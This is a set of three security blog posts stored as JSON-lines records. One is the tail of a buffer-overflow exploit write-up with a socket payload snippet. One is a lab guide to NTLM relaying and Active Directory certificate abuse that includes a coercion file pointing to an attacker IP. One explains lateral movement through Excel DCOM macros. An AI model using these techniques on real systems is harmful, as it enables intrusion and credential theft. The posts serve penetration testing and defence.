Keep-Alive\\r\\n\\r\\n\"\n)\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target, port))\ns.send(buf)\ns.close()\nFinal thoughts\nWe\u2019ve just gone through an account of how I found a bug through\nfuzzing, examined it, and wrote an exploit to take execute arbitrary\ncode on the server. There is currently no patch that addresses this\nvulnerability, making this a 0-day exploit. You\u2019ll also recall that we\nnever even finished the fuzzing session. There could be more\nvulnerabilities waiting to be discovered in this application.\nUsually at this point I refine the exploit a little more, test it\nagainst other versions of Windows to see how portable it is, and so on.\nI tested this exploit against Windows XP Professional SP2 and SP3. The\none thing that changes are the stack addresses. Although XP has no\nASLR, you would need to know the first four bytes of the address you\nwant to jump to on the stack, and that would require testing it on\nother Windows machines. Additionally, since it references a stack\naddress, the exploit won\u2019t work against Windows Vista and higher which\nhave ASLR. Although the program is technically vulnerable, you would\nneed to find another way to exploit it.\nYou can find the final version of the exploit I submitted to Exploit-DB\n[18]here. This version works with both Windows XP Professional SP2 and\nSP3 by guessing the stack address containing the pointer to CALL ESI.\nI hope this post was informative and interesting. If you have your own\nworkflow and favorite tools, I\u2019d love to hear about them in the\ncomments.\nPlease enable JavaScript to view the [19]comments powered by Disqus."}
{"text":"#[1]home [2]alternate [3]home\nIFRAME: [4]https:\/\/www.googletagmanager.com\/ns.html?id=GTM-WNTJBFX\n[5]Skip to Main Content\n* [6]Solutions\nSolutions\nOur custom solutions are tailored to address the unique challenges\nof different roles in security.\n[7]Solutions\n+ 01\nFor Leadership\nWe understand the challenges facing modern executives and\ndevelop solutions unique to leaders.\n+ 02\nFor Operations\nWe stay one step ahead to proactively safeguard our clients\nand partners.\n+ 03\nFor Infrastructure\nFrom architecture to resiliency and maintainability, we keep\nyour tech aligned to best practices.\n+ 04\nFor Assurance\nOur compliance experts guide partners through regulatory\nrequirements to ensure standards are met.\n* [8]Services\nServices\nFrom building to testing to hardening, our services support\nsecurity at every stage.\n[9]Services\n+ 01\nDesign\nDesign an exceptional, custom security program alongside our\nsecurity experts.\n+ 02\nEvaluate\nEvaluate your security program with proven assessment\nmethodologies.\n+ 03\nHarden\nHarden your security program with the help of our security\nexperts.\n+ 04\nRespond\nRespond to threats to your security program with the help of\nour security experts.\n* [10]Research\n* [11]Resources\n* [12]About Us\nAbout Us\nDriven by purpose, fueled by experts.\n[13]About Us\n+ 01\nOur Team\nMeet our security experts.\n+ 02\nOur Partners\nBecome a TrustedSec partner to help your customers anticipate\nand prepare for potential attacks.\n+ 03\nNews\nOur team is trusted by local and national media to be the\nsubject matter experts for security news.\n+ 04\nEvents\nSee our upcoming webinars, conferences, talks, trainings, and\nmore!\n(BUTTON) Search (BUTTON) Menu\nSearch Input ____________________ (BUTTON) Search\n* [14]Contact Us\n* [15]Report a breach\n* [16]Solutions\n* [17]Services\n* [18]Research\n* [19]Resources\n* [20]About Us\n(BUTTON) Search\n* [21]Contact Us\n* [22]Report a breach\n* [23]Blog\n* [24]I\u2019m bringing relaying back: A comprehensive guide on relaying\nanno 2022\nFebruary 03, 2022\nI\u2019m bringing relaying back: A comprehensive guide on relaying anno 2022\nShare\n* [25]Share URL\n* [26]Share via Email\n* [27]Share on Facebook\n* [28]Share on X\n* [29]Share on LinkedIn\nFor years now, Internal Penetration Testing teams have been successful\nin obtaining a foothold or even compromising entire domains through a\ntechnique called NTLM relaying. The earliest, most descriptive relaying\nblog post I could find dates all the way back to 2017 written by\nMarcello, better known as byt3bl33d3r:\n[30]https:\/\/byt3bl33d3r.github.io\/practical-guide-to-ntlm-relaying-in-2\n017-aka-getting-a-foothold-in-under-5-minutes.html\nAt the time of writing this blog post in 2022, (un)surprisingly,\nrelaying is still very much alive. This blog post aims to be a\ncomprehensive resource that will walk through the attack primitives\nthat continue to work today. While most will be well known techniques,\nsome techniques involving Active Directory Certificate Services might\nbe lesser known.\nThe Lab Setup\nFor this blogpost, I have created a mini lab in Snap Labs, which will\nbe available alongside this blog post for anyone with an account.\nUnfortunately, AWS does some weird magic in their backend which\nprevents multicast traffic from hitting Responder. As a results, I was\nforced to create the lab offline.eq\nThe lab architecture looks as follows:\nOur lab contains three (3) servers in one (1) domain (bravoteam.local)\n:\n* The domain controller - A server 2019 instance with Active\nDirectory Domain Services (needed to become a domain controller)\nand Active Directory Certificate Services installed (for AD CS\nabuse avenues in this blog post)\n* Server 1 - A Windows Server 2019 out of the box, no special\nconfigurations have been made\n* Server 2 - Also a Windows Server 2019 without any special\nconfiguration\nOur domain has four (4) users:\n* Bravoteam\\blackburn - Enterprise admin\n* Bravoteam\\hayes - Domain admin\n* Bravoteam\\spenser - A regular domain user that has local admin\nprivileges on server 1\n* Bravoteam\\perry - A regular domain user with no special privileges\nat all\nAll these users have the same password of Qwerty123, as this is a lab\nenvironment, and they have not had their properties modified in any\nspecial way.\nThe Attacker Machine\nWe will also need an attacker-controlled machine in the form of a Linux\nsystem. In this blog post, we will be using a Kali machine. Regardless\nof what your distro of choice is, the following tools will be required\nto follow along this blog post:\n* Responder ([31]https:\/\/github.com\/lgandx\/Responder)\n* Impacket ([32]https:\/\/github.com\/SecureAuthCorp\/impacket)\n* Crackmapexec ([33]https:\/\/github.com\/byt3bl33d3r\/CrackMapExec)\n* mitm6 ([34]https:\/\/github.com\/dirkjanm\/mitm6)\n* Certipy ([35]https:\/\/github.com\/ly4k\/Certipy)\nAttack 0: No Attack at all, be Quiet and Just Listen\nIn order to assess the effectiveness of relaying attacks, we will need\nto learn more about our network environment. In order to succeed with\n'classic' relaying attacks, some prerequisites must be met:\n1. There must be broadcast traffic in the environment. Classic\nexamples of this are DNS replacement protocols like Link Local\nMulticast Name Resolution (LLMNR) and NetBIOS Name Resolution\n(NBT-NS).\n2. We must have suitable targets (servers with SMB signing not\nenforced).\nLater in this blog post, we will also take a look at some other\nattacks, but let's focus on the basics first.\nIn order to check if prerequisite number one is met, we can use\nResponder in analyze mode as follows.\nFigure 1 - Responder in Analyze Mode\nThe A flag makes sure we are just listening in, but we are not actually\npoisoning anything. If there is broadcast traffic present, it should\nnot take too long before you will get some noise in your console\nwindow.\nFigure 2 - Broadcast tTraffic\nWe see some NBT-NS traffic flying in, which is good news for\nadversaries but less so for organizations.\nThe next step is to verify whether we have servers present with SMB\nSigning disabled. This will usually be the case, as SMB Signing is only\nenforced on domain controllers by default and is usually not turned on\nby organizations due to it affecting performance.\nIn order to verify whether our assumption is correct, we can utilize\nCrackMapExec\u2019s SMB module with the \u2013gen-relay-list flag to compile a\nlist of all servers that have SMB Signing disabled.\nNote: This is a lab environment with three (3) machines\u2014in a real-life\norganization, this list would be significantly longer.\nFigure 3- Domain Controller With SMB Signing Enabled\nAs expected, the domain controller has SMB Signing on, but the other\ntwo (2) servers in the domain have SMB signing off, which makes them\nprime relay targets. Now that we did our recon, let\u2019s take a look at\nall the shenanigans we can pull here. But before we do, I wanted to\npoint out some interesting behavior about Responder in analyze mode.\nWhile it is true that Responder in analyze mode does not poison\nanything, it will still capture the hash (provided the SMB or any other\nserver-like HTTP that could receive connections is turned on).\nThis is useful for when you are on an engagement and your client has\nsome kind of network spider or software that does patch management, as\nyou will be able to capture the hash of that account without having to\npoison anything.\nFigure 4 - Juicy NTLM Hash\nKeep in mind that NetNTLMv1 and NetNTLMv2 hashes are not the actual\nNTLM hashes that can be used for pass-the-hash type attacks. NetNTLM\nhashes are the result of a challenge and response protocol. NetNTLM\nhashes can only be utilized for relaying attacks or for potential\nbrute-forcing using Hashcat, for example.\nAnother pro tip is that NTLMv2 hashes are harder to crack than their\nNTLMv1 counterpart but not impossible for user accounts! Computer\naccounts, on the other hand, are not worth your computing power as you\nwon\u2019t crack them in the NetNTLMv2 format. (Note: This is important for\nlater.)\nAttack 1: The Classic SAM Dump SMB to SMB Relay Using Responder and NTLM\nRelay\nProbably the best-known attack scenario is to use Responder and NTLM\nrelay together. This approach relies on broadcast protocols in the\nnetwork such as LLMNR or NBT-NS. In order for Responder and NTLM relay\nto work nicely together, we have to modify the Responder.conf file and\ndisable the HTTP and SMB servers (as NTLM relay will be our SMB and\nHTTP server).\nFigure 5 - Turning the SMB and HTTP Server off in Responder.conf\nIf an attacker is able to relay authentication of a user to a system\nthat has SMB Signing turned off (default) and that user happens to be a\nlocal admin on that system, the default behavior of NTLM relay is to\ndump the security account manager database and reveal the password\nhashes of local accounts.\nIn order to perform the attack, we will relay using the NTLM relay\nscript from the Impacket suite. We can easily set up the relay using\nour generated target file from earlier as follows.\nFigure 6 - Setting up NTLM Relay\nThe way I like to run Responder is using either -rdwF or -rdP (which is\neasy to remember thanks to the RDP, lol). Nowadays, the rdP flags will\nprobably be more successful than the wF counterpart, as explained by\nLaurent Gaffi\u00e9 in this blogpost:\n[36]https:\/\/g-laurent.blogspot.com\/2021\/08\/responders-dhcp-poisoner.htm\nl\nWhy -P and not -F? Nowadays, WPAD NTLM authentication is unlikely\nsuccessful, therefore forcing NTLM authentication on wpad.dat\nretrieval is not recommended. The concept is to serve the wpad.dat\nfile with no user authentication, and as soon the client starts\nusing our proxy, we force authentication with the Proxy-Auth module\n:)\nUpdate:In the newer versions of Responder, the -r and -f flags have\ndisappeared. Additionally, the -d flag has now been changed from\n\u201cEnable answers for NETBIOS domain suffix queries. Answering to domain\nsuffixes will likely break stuff on the network. Default: False\u201d to\n\u201cEnable answers for DHCP broadcast requests. This option will inject a\nWPAD server in the DHCP response. Default: False\u201d. It should also be\nnoted that -d as it is now CAN have an impact on your client's network,\nas you are effectively poisoning the WPAD file over DHCP, which does\nnot always revert back immediately once you stop the attack. It will\nlikely require a reboot.\nFigure 7- Responder in rdP Mode (Careful With the New d Flag Though!)\nNow we see something strange.\nWe get a successful authentication for Spenser, but it seems like we\ncannot relay to the server where Spenser is a local admin\u2014why is that?\nFigure 8 - Failed Authentication Figure 9 - Spenser is Admin on this\nServer\nThis is because a computer cannot relay toward itself, and Microsoft\nfixed that issue a long time ago. Let\u2019s try it again, but this time we\nwill trigger the relay from srv01 toward srv02 as Spenser:\nFigure 10 - Much Better! We get a Dumped SAM\nThis time our SAM dump worked because the originating request came from\nanother IP address (srv01) than the one that we relayed to (srv02).\nAttack 1B:Proxy Chaining the SMB Connection Using Responder and NTLM Relay\nA twist to this approach is to utilize the SOCKS option in NTLM relay.\nThis is by far my favorite approach as it will give you a nice overview\nof successfully relayed attempts even if the user was not a local admin\nto the relayed machine. This gives you a much cleaner view of your\noperation than trying to sift through the NTLM relay logs as they\nhappen, because even though I love NTLM relay, the logging is\nsuper-duper noisy.\nFigure 11 - Everything is Better With SOCKS\nThis time, I modified my GPO on the domain controller so Spenser is\nallowed to log in. This way, you can see the full effect of the SOCKS\nproxy as now authentication as Spenser will succeed on both srv01 and\nsrv02.\nFigure 12 - We got Some Sessions!\nAs you can see, the SOCKS command will give a nice overview of which\nrelays were successful, and the SOCKS option will keep the SMB\nconnection open indefinitely for you. In this example, we can see that\nSpenser has admin rights on srv02 (10.10.10.55) but not on srv01\n(10.10.10.69).\nYou can now use secretsdump.py to dump the SAM database or even use\nlsassy or another tool to start dumping LSASS.\nDo not forget to change your SOCKS proxy configuration before going all\nbananas.\nFigure 13 - Edit our SOCKS Configuration Figure 14 - The Default SOCKS\nConfig for ntlmrelayx.py is on Port 1080\nAfter setting the proxy chains to the NTLM relay SOCKS proxy, we can\nnow proxychain whichever tool we want and it will ignore the password\nvalue and use the relay credential instead.\nFigure 15 - Dumping Hashes Over SOCKS\nI should stress here that even if you are not local admin on the\nsystem, there could still be confidential files within your grasp if\nyou have time to hunt for them. In this example, Spenser does not have\nlocal admin rights on srv01 but is able to access the finance share\nwith confidential client data.\nFigure 16 - We can Also Access File Shares!\nAttack 2: Enumerating Over LDAP\nThis attack set up is very similarly to what we already used in prior\nattacks.\nFigure 17- Setting up ntlmrelayx.py for LDAP This Time\nHowever, domain controllers have SMB Signing enabled by default, so you\ncan guess what happens next\u2026\nFigure 18 - Signature Please?\nAs we expected, we get a nice verbose error saying that the client\nrequests signing, so it is not possible to invoke a relay like that.\nDoes that mean we are stuck? Well, no \ud83d\ude0a\nWe have two (2) options here:\n* WebDAV shenanigans\n* Mitm6\nAttack 2A: WebDAV Shenanigans\nSMB to LDAP is not an option because we have SMB signing problems, but\nwhat would happen if we use another protocol such as HTTP? In order for\nthis attack to work, we will need to figure out if the webclient\nservice is running in the environment.\nBy using hackanddo\u2019s webclientservicescanner (needs valid domain\ncredentials), we can figure out if this is the case. The\nwebclientservicescanner is very easy to use\u2014you basically provide the\ntool with valid credentials and it will reach out to all the computers\nin the domain over RPC to look for the \\pipe\\DAV RPC SERVICE.\nUnfortunately, this service is usually not enabled by default.\nFigure 19 - No Luck on the webclient Front\nEnumerating this is nice but not really necessary. We can brute-force\nwebclient connections if needed, as we will see soon.\nStarting the webclient Service\nThese techniques only work if the webclient service is actually\ninstalled on the systems\u2014they will not magically be installed by\nrunning the mentioned programs or browsing to the special files.\nThanks to James Foreshaw, we have a way to enable the webclient\nautomatically through some low-level ETW shenanigans (this was later\nalso ported to a C# version by Alessandro Magnosi).\nThere is also another approach we can take, which is playing with\nspecial files such as the Documents.searchConnector-ms file, as\ndescribed by several researchers at MDSec.\nThe content of such a document looks as follows:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?> <searchConnectorDescription xmlns=\"http:\/\n\/schemas.microsoft.com\/windows\/2009\/searchConnector\"> <iconReference>imageres.dl\nl,-1002<\/iconReference> <description>Microsoft Outlook<\/description> <isSearchOn\nlyItem>false<\/isSearchOnlyItem> <includeInStartMenuScope>true<\/includeInStartMen\nuScope> <iconReference>https:\/\/<strong><em>10.10.10.137<\/em><\/strong>\/0001.ico<\/\niconReference> <templateInfo> <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}\n<\/folderType> <\/templateInfo> <simpleLocation> <url>https:\/\/<strong><em>www.trus\ntedsec.com<\/em><\/strong>\/<\/url> <\/simpleLocation> <\/searchConnectorDescription>\nIf we can drop this file somewhere and call it\nDocuments.searchConnector-ms, we can forcefully start a webclient\nconnection.\nThat finance share we were able to access from an unprivileged\nperspective starts to look pretty good now, doesn\u2019t it? \ud83d\ude09\nLet\u2019s drop the file on the finance share and browse to it on our\nserver. Look what it does to the webclient service in particular.\nFigure 20 - Dropping the searchconnector in our Unprivileged Share\nFigure 21 - srv02's webclient Suddenly Kicked off When Browsing to the\nShare\nMagic! The webclient service has started on our server (srv02).\nFor our next step, how can we force an authentication over HTTP?\nSomething About a Hippopotamus and Printers\nLee Christensen published a way to coerce authentication over MS-RPRN\nRPC all the way back in 2018. This was later dubbed spoolsample or\nprinterbug, as this relies on the spooler service to be running on the\nsystem.\nIn 2021, Lionel Gilles found a similar coerced authentication method,\nthis time over the MS-EFSRPC (file encryption protocol), and this\nattack was dubbed PetitPotam.\nThe crazy thing about PetitPotam is that it worked from an\nunauthenticated perspective. This has since been patched, but it is not\nuncommon to come across the unpatched vulnerability every now and then.\nUsing these coercion methods, it is possible to trigger an\nauthentication over HTTP to our attacker-controlled machine using our\nhostname@80\/something as the target.\nFigure 22 - Using the printerbug to Force Authentication Figure 23 -\nUsing PetitPotam to Force Authentication\nFor illustration purposes, I killed NTLM relay for a minute and enabled\nResponder's HTTP server again so we can clearly see what is happening.\nFigure 24 - Drowning in Hashes\nWe see the hashes flying in! This means we can probably relay to LDAP,\nso let\u2019s give it a go, shall we?\nFigure 25 - Enumerating the Domain Thanks to Dirk-jan Mollema\nWe were successful in enumerating the domain information! However,\nsince printerbug and PetitPotam both needed authentication to work, we\ncould have just used a tool like ldapdomaindump to directly bind to\nLDAP ourselves and dump the data directly.\nIs there a easier way to achieve the same result, preferably\nunauthenticated? Let\u2019s find out\u2026\nAttack 2B: mitm6\n2018 was a very nice year for the offensive community, as Dirk-jan\nMollema published research about IPv6-based MitM attacks.\nIn modern Windows operating systems, IPv6 is enabled by default. This\nmeans that systems periodically poll for an IPv6 lease, as IPv6 is a\nnewer protocol than IPv4, and Microsoft decided it was a good idea to\ngive IPv6 precedence over IPv4.\nHowever, in the vast majority of organizations, IPv6 is left unused,\nwhich means that an adversary could hijack the DHCP requests for IPv6\naddresses and force authentication attempts to the attacker-controlled\nsystem. We do that by setting our system as the primary DNS server.\n[37]https:\/\/dirkjanm.io\/worst-of-both-worlds-ntlm-relaying-and-kerberos\n-delegation\/\nFirst, we launch mitm6 and spoof any requests for internal resources.\nFigure 26 - Let's do Some IPv6 Shenanigans\nWhen a user attempts to browse to an internal resource, they will be\npresented with login prompt.\nFigure 27 - Just an Innocent Login Prompt\nIf the user fills in their credentials, pat yourself on the back and\ngrab a beer because you successfully relayed to LDAP from an\nunauthenticated standpoint.\nFigure 28 - From Unauthenticated to Authenticated Domain Enumeration\nAttack 3: Fun With LDAP\u2019s 'Secure' Counterpart, LDAPS!\nIn last attack scenario, we used the LDAP protocol to dump the Active\nDirectory objects, but we still do not have a real foothold, do we?\nLet's change that by relaying to LDAPS instead.\nUsing LDAP\u2019s 'secure' twin, we are able to add a new computer account\nby abusing the fact that, by default, users are allowed to domain-join\nup to 10 new computer objects. This can be changed but often is not the\ncase\nLet\u2019s set up NTLM relay to target LDAPS and see if we can find someone\nhelpful enough to add our trustedcomputer01 to the domain for us.\nNote: When possible, use the FQDN instead of the IP address. The IP\naddress works most of the time, but FQDN looks cleaner and avoids SNI\ncertificate conflicts.\nFigure 29 - LDAP was Fun, but LDAPS is Cooler\nAs with the previous attack, use mitm6 or PetitPotam\/printerbug\ntargeting a system that has the webclient service running. Or, if you\nare bold enough, just spray and pray PetitPotam\/printerbug to all\ndomain computers.\nAfter some time letting mitm6 run, we get a successful relay\nFigure 30 - New Computer Added\nWe get a new computer added, thanks to our dear friend srv02 \ud83d\ude0a!\nNow we can use this computer to do authenticated stuff in the domain,\nlike using PetitPotam\/printerbug or even BloodHound\/kerberoasting\u2026\nAttack 4:Resource Based Constrained Delegation anyone?\nFor those of you who are unaware of what resource-based constrained\ndelegation is, I recommend reading the excellent blog post from\nSpecterOps here:\n[38]https:\/\/posts.specterops.io\/kerberosity-killed-the-domain-an-offens\nive-kerberos-overview-eb04b1402c61\nIt basically boils down to configuring certain systems in Active\nDirectory to be allowed to request Kerberos tickets on behalf of other\nusers. By setting the msDS-AllowedToActOnBehalfOfOtherIdentity\nattribute, we are indicating that we trust any authentication that\noriginates from the value in the attribute. For example, if SRV02 has\nmsDS-AllowedToActOnBehalfOfOtherIdentity set to srv01, this means that\nsrv02 trusts authentications coming from srv01. What you might find\ninteresting is that a computer account is able to set this property on\nitself.\nEssentially, this means if we are able to get an NTLM relay working\nfrom a computer account and delegate it to LDAPS, we can set the\nmsDS-AllowedToActOnBehalfOfOtherIdentity attribute to any arbitrary\nvalue. If we set it to a value of a computer that we created, we can\nset our newly created computer up for regular constrained delegation.\nThis will make our new computer able to request service tickets for\nitself on behalf of any user in the domain (S4U2Self) and then forward\nit to the relayed computer (S4U2Proxy) because the relayed computer\nexplicitly trusts our new computer due to the\nmsDS-AllowedToActOnBehalfOfOtherIdentity attribute.\nTL;DR If we can relay a computer account to LDAPS that is allowed to\nadd additional computers to the domain, we can compromise the relayed\ncomputer by impersonating a domain admin on the relayed computer.\nLet\u2019s see this in action.\nWe are going to set up ntlmrelayx.py to LDAPS, but this time we are\ngoing to use the \u2013delegate-access flag.\nFigure 31 - Resource-Based Constrained Delegation With a Touch of\nRelaying\nThis time, we will use PetitPotam with our previously created computer\naccount just for fun.\nFigure 32 - Another PetitPotam Authentication\nAnd if we now look to NTLM relay we can see that we added a new\ncomputer and granted it delegation rights towards SRV01$\nFigure 33 - What a Killchain! Resource-Based Constrained Delegation\nSuccess!\nWe can now use getST.py to get a service ticket for the CIFS service\nfor SRV01$, which will allow us to use the ticket in combination with\nsecretsdump to dump SAM.\nFigure 34 - Compromising the Server With Resource-Based Constrained\nDelegation\nAttack 5: LDAP is Fun, Especially With Shadow Credentials\nSo far, this blog post has covered pretty well-known attack avenues.\nLet\u2019s dive into the more novel stuff as a reward for reading through\nthis massive post\nThis is an attack avenue that is relatively novel, as I have not seen\nmany people discuss this attack vector before. Quite recently, Impacket\nreceived a pull request\n([39]https:\/\/github.com\/ShutdownRepo\/impacket\/tree\/shadowcredentials)\nfrom shutdownrepo and nodauf, who figured out that we can use NTLM\nrelay for shadow credentials, allowing us to compromise the computer or\nuser.. If you are unfamiliar with what shadow credentials are, I highly\nrecommend reading the blog post of Elad Shamir, as he is the discoverer\nof this beautiful 'feature':\n[40]https:\/\/posts.specterops.io\/shadow-credentials-abusing-key-trust-ac\ncount-mapping-for-takeover-8ee1a53566ab\nFrom the post above:\nTl;dr\nIt is possible to add \u201cKey Credentials\u201d to the attribute\nmsDS-KeyCredentialLink of the target user\/computer object and then\nperform Kerberos authentication as that account using PKINIT.\u201c\nWhat do we need for this attack?\n* The functional level of the domain needs to be Server 2016 or above\n(I hope this is the case for the vast majority of your clients,\notherwise they probably have bigger issues).\n* Active Directory Certificate Services (ADCS) need to be enabled in\nthe domain, and the domain controller needs to have a digital\ncertificate for service authentication installed.\nWe can enumerate if there is a certificate authority using Certipy:\nFigure 35 - Enumerating Templates\nWe can see that there is a certificate authority present in the domain,\nand it is in fact our domain controller. We also know that the domain\ncontroller is up to date thanks to our CrackMapExec reconnaissance\nearlier. This means chances are pretty good that our shadow credential\nattack will work fine.\nNow it's time to test the shadow credential relaying attack. I\nrecommend setting up a virtualenv and installing the patched Impacket\nin the venv instead of overriding the production Impacket.\nFigure 36 - Relaying With Shadow Credentials Thanks to nodauf\nLet\u2019s go wild and trigger an authentication from our dear server with\nwebclient enabled.\nFigure 37 - We Like PetitPotam, but mitm6 and spoolsample Also Work\nNote: We can also use mitm6 or any other coerced authentication\nmechanism that triggers an HTTP connection.\nLet\u2019s check our NTLM relay.\nFigure 38 - compromising the server through shdadow credentials\nWe can now use PKINIT tools as instructed to obtain a TGT for the\nserver, and we could even go further and UnPAC-the-hash to retrieve the\nNTLM password.\nFigure 39 - Some Dirk-jan Mollema Magic to Reveal the NT Hash\nAttack 6: ESC8 for the Win\nWhen there is a certificate authority in the domain that has the web\nenrollment feature enabled, it is possible to perform NTLM relaying to\nthe HTTP endpoint to obtain a certificate.\nSince we already know there is a certificate authority present, let\u2019s\ntry to relay to it.\nFigure 40 - Time for Certificate Abuse\nThe fun part about the certificate authority being available over plain\nHTTP is that it does not matter which protocol is being used to relay,\nit will always work. SMB or HTTP does not matter at this point.\nThis time I relayed just with Responder, but printerbug, PetitPotam, or\nmitm6 will all do nicely\nFigure 41 - If You See This Massive base64 Blob, it is Time to Party,\nas we can compromise the user\/computer\nAfter we have obtained the certificate, we can use it to get a TGT and\neven the NT hash via UnPAC-the-hash using pkinittools from Dirk-jan\nMollema:\nFigure 42 - Getting a TGT With the Certificate Figure 43 - Extracting\nthe NT Hash From the TGT Using the AS-REP Key\nConclusions\nThe moral of the story is broadcast protocols and coerced\nauthentication can lead to disastrous consequences. If possible,\nplease, please disable them in your environment and make sure to keep\nyour tier 0 (or any other tier for that matter) up to date with the\nlatest patches.\nI hope this blog post has opened the eyes of  both offensive and\ndefensive security practitioners worldwide so they can realize that\nNTLM relaying has much, much more to offer than just simply relaying to\ndump the SAM database.\nShoutouts\nTo close off this blogpost, I want to give some shoutouts to the\nexcellent researchers that have contributed towards the tooling that\nmake these attack primitives easy for us to execute:\n* [41]Dirk-jan Mollema\n* [42]Laurent Gaffi\u00e9\n* [43]James Forshaw\n* [44]Lee Christensen\n* [45]Lionel Gilles\n* [46]Charlie Bromberg\n* [47]Florian Audon\n* [48]Dtmsecurity\n* [49]Alessandro Magnosi\n* [50]Romain Bentz\n* [51]netbiosX\n* [52]Maximus (gladiatx0r)\n* [53]Dominic Chell\n* [54]Oliver Lyak\nSpecial shoutout to [55]Justin Bollinger for reviewing this massive\ndocument!\nAnd probably countless others that I forgot to mention.\nThis concludes the (somewhat lengthy) NTLM relay blog post, I hope this\ninformation will be useful to you! \ud83d\ude0a"}
{"text":"#[1]enigma0x3 \u00bb Feed [2]enigma0x3 \u00bb Comments Feed [3]enigma0x3 \u00bb\nLateral Movement using Excel.Application and DCOM Comments Feed\n[4]alternate [5]alternate [6]enigma0x3 [7]WordPress.com\nRed Teamer and Security Addict\n[8]enigma0x3\nPost navigation\n[9]\u00ab UMCI vs Internet Explorer: Exploring CVE-2017-8625\n[10]UMCI Bypass Using PSWorkFlowUtility: CVE-2017-0215 \u00bb\nLateral Movement using Excel.Application and DCOM\n[11]September 11, 2017 by [12]enigma0x3\nBack in January, I put out two blog posts on using DCOM for lateral\nmovement; one using [13]MMC20.Application and the other outlining two\nother DCOM applications that expose [14]\u201cShellExecute\u201d methods. While\nmost techniques have one execution method (WMI has the Create() method,\npsexec creates a service with a custom binpath, etc.), DCOM allows you\nto use different objects that expose various methods. This allows an\noperator to pick and choose what they look like when they land on the\nremote host from a parent-child process relationship perspective.\nIn this post, I\u2019m going to walk through abusing the\n[15]Excel.Application DCOM application to execute arbitrary code on a\nremote host. This same DCOM application was recently talked about for\nlateral movement by using the [16]RegisterXLL method, which you can\nread about [17]here. In this post, I\u2019m going to focus on the\n\u201c[18]Run()\u201d method. In short, this method allows you to execute a named\nmacro in a specified Excel document. You can probably see where I\u2019m\ngoing with this \ud83d\ude42\nAs you all may know, VBA macros have long been a favorite technique for\nattackers. Normally, VBA abuse involves a phishing email with an Office\ndocument containing a macro, along with enticing text to trick the user\ninto enabling that malicious macro. The difference here is that we are\nusing macros for pivoting and not initial access. Due to this, Office\nMacro security settings are not something we need to worry about. Our\nmalicious macro will execute regardless.\nAt this point, we know that Excel.Application is exposed via DCOM. By\nusing [19]OLEViewDotNet by James Forshaw ([20]@tiraniddo), we can see\nthat there are no explicit launch or access permissions set:\nIf a DCOM application has no explicit Launch or Access permissions,\nWindows allows users of the Local Administrator group to Launch and\nAccess the application remotely. This is because DCOM applications have\na \u201cDefault\u201d set of Launch and Access permissions. If no explicit\npermissions are assigned, the Default set is used. This can be found in\ndcomcnfg.exe and will look like this:\nSince Local Administrators are able to remotely interface with\nExcel.Application, we can then remotely instantiate it via PowerShell\nusing [Activator]::CreateInstance():\nAs you can see, remote instantiation succeeded. We now have the ability\nto interact with Excel remotely. Next, we need to move our payload over\nto the remote host. This will be an Excel document that contains our\nmalicious macro. Since VBA allows Win32 API access, the possibilities\nare endless for various shellcode runners. For this example, we will\njust use shellcode that starts calc.exe. If you are curious, you can\nfind an example [21]here.\nJust create a new macro, name it whatever you want, add in your code\nand then save it. In this instance, my macro name is \u201cMyMacro\u201d and I am\nsaving the file in the .xls format.\nWith the actual payload created, the next step is to copy that file\nover to the target host. Since we are using this technique for Lateral\nMovement, we need Local Admin rights on the target host. Since we have\nthat, we can just copy the file over:\nWith the payload on target, we just need to execute it. This can be\ndone using the Run() method of the Excel.Application DCOM application\nthat was instantiated earlier. Before we can actually call that method,\nthe application needs to know what Excel file the macro resides in.\nThis can be accomplished using the \u201cWorkbooks.Open()\u201d method. This\nmethod just takes the local path of the file. So, what happens if we\ninvoke the method and pass the location of the file we just copied?\nWell, isn\u2019t that interesting. The file exists, but Excel.Application is\nstating that it doesn\u2019t. Why might this be? When Excel.Application is\ninstantiated via DCOM, it is actually instantiated via the Local System\nidentity. The Local System user, by default, does not have a profile.\nSince Excel assumes that it is in an interactive user session, it fails\nin a less than graceful way. How can we fix this? There are better ways\nto do this, but a quick solution is to remotely create the Local System\nprofile.\nThe path for this profile will be:\nC:\\Windows\\System32\\config\\systemprofile\\Desktop and\nC:\\Windows\\SysWOW64\\config\\systemprofile\\Desktop.\nNow that the Local System profile is created, we need to re-instantiate\nthe Excel.Application object and then call \u201cWorkbooks.Open()\u201d again:\nAs you can see, we were now able to open the workbook containing our\nmalicious macro. At this point, all we need to do is call the \u201cRun()\u201d\nmethod and pass it the name of our malicious macro. If you remember\nfrom above, I named mine \u201cMyMacro\u201d\nCalling \u201cRun(myMacro)\u201d will cause the VBA in that macro to execute. To\nverify this, we can open Process Explorer on the remote host and\nverify. As you can see below, this particular host has the \u201cDisable VBA\nfor Office Applications\u201d GPO set. Regardless of that security setting,\nthe macro is permitted to execute:\nFor this example, I just used calc spawning shellcode, which resulted\nin a child process being spawned under Excel.exe. Keep in mind that\nsince VBA offers a lot in terms of interaction with the OS, it is\npossible to not spawn a child process and just inject into another\nprocess instead. The final steps would be to remotely cleanup the Excel\nobject and delete the payload off the target host.\nI have automated this technique via PowerShell, which you can find\nhere: [22]https:\/\/gist.github.com\/enigma0x3\/8d0cabdb8d49084cdcf03ad8945\n4798b\nTo assist in mitigating this vector, you could manually apply remote\nLaunch and Access permissions to the Excel.Application object\u2026but don\u2019t\nforget to look at all the other Office applications. Another option\nwould be to change the default remote Launch\/Access DACLs via\ndcomcnfg.exe. Keep in mind that any DACL changes should be tested as\nsuch modifications could potentially impact legitimate usage.  In\naddition to that, enabling the Windows Firewall and reducing the number\nof Local Administrators on a host are also valid mitigation steps.\nWhat stands out the most with this technique is that Excel and the\nchild process will spawn as the invoking user. This will often be\nprocess creations from user accounts that different than the user that\nis currently logged on. If those are the only two processes and the\nuser account being used doesn\u2019t normally logon to that host, that might\nbe a red flag.\n-Matt N.\nShare this:\n* [23]Twitter\n* [24]Facebook\n*\nLike Loading...\nRelated\nBookmark the [25]permalink.\nLeave a Reply [26]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nSearch for: ____________________ Search\nRecent Posts\n* [27]CVE-2023-4632: Local Privilege Escalation in Lenovo\nSystem Updater\n* [28]Avira VPN Local Privilege Escalation via Insecure\nUpdate Location\n* [29]CVE-2019-19248: Local Privilege Escalation in EA\u2019s\nOrigin Client\n* [30]Avira 